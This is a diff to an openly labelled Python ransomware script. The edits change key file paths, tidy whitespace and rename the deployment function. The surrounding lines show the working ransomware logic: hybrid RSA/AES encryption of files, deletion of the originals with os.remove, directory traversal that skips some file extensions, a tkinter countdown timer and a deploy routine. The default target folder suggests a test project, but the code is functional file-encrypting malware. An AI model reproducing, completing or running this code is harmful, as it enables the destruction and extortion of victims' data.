@@ -10,7 +10,7 @@ from Crypto.Cipher import PKCS1_OAEP, AES
 import tkinter as tk
 from functools import partial
 
-with open('public.pem', 'rb') as f:
+with open('./media/public.pem', 'rb') as f:
     public = f.read()
 print(base64.b64encode(public))
 
@@ -53,8 +53,7 @@ def decrypt(dataFile, privateKeyFile):
     with open(decryptedFile, 'wb') as f:
         f.write(data)
 
-    print('Decrypted file saved to ' + decryptedFile)
-    
+    print('Decrypted file saved to ' + decryptedFile) 
     
 def encrypt(dataFile, publicKey):
     '''
@@ -91,7 +90,6 @@ def encrypt(dataFile, publicKey):
         [f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
     os.remove(dataFile)
 
-
 def encryption_traversal():
     directory = '~/Desktop/TestFolder/'  # CHANGE THIS
     excludeExtension = ['.py', '.pem', '.exe']  # CHANGE THIS
@@ -112,8 +110,7 @@ def decryption_traversal():
 
         if fileType in excludeExtension:
             continue
-        decrypt(str(filePath), 'private.pem')
-
+        decrypt(str(filePath), './media/private.pem')
 
 def countdown(count):
     # change text in label
@@ -138,14 +135,12 @@ def countdown(count):
             second = 59
         root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
 
-
-
 ###########################################################################################################################
 #################################################     INITIALIZATIONS     #################################################
 ###########################################################################################################################
 
 # Deploys the ransomware
-def deploy_ransomware(key = None):
+def encrypt_ransomware(key = None):
     if type(key) == type(None): return
     
     encryption_traversal()
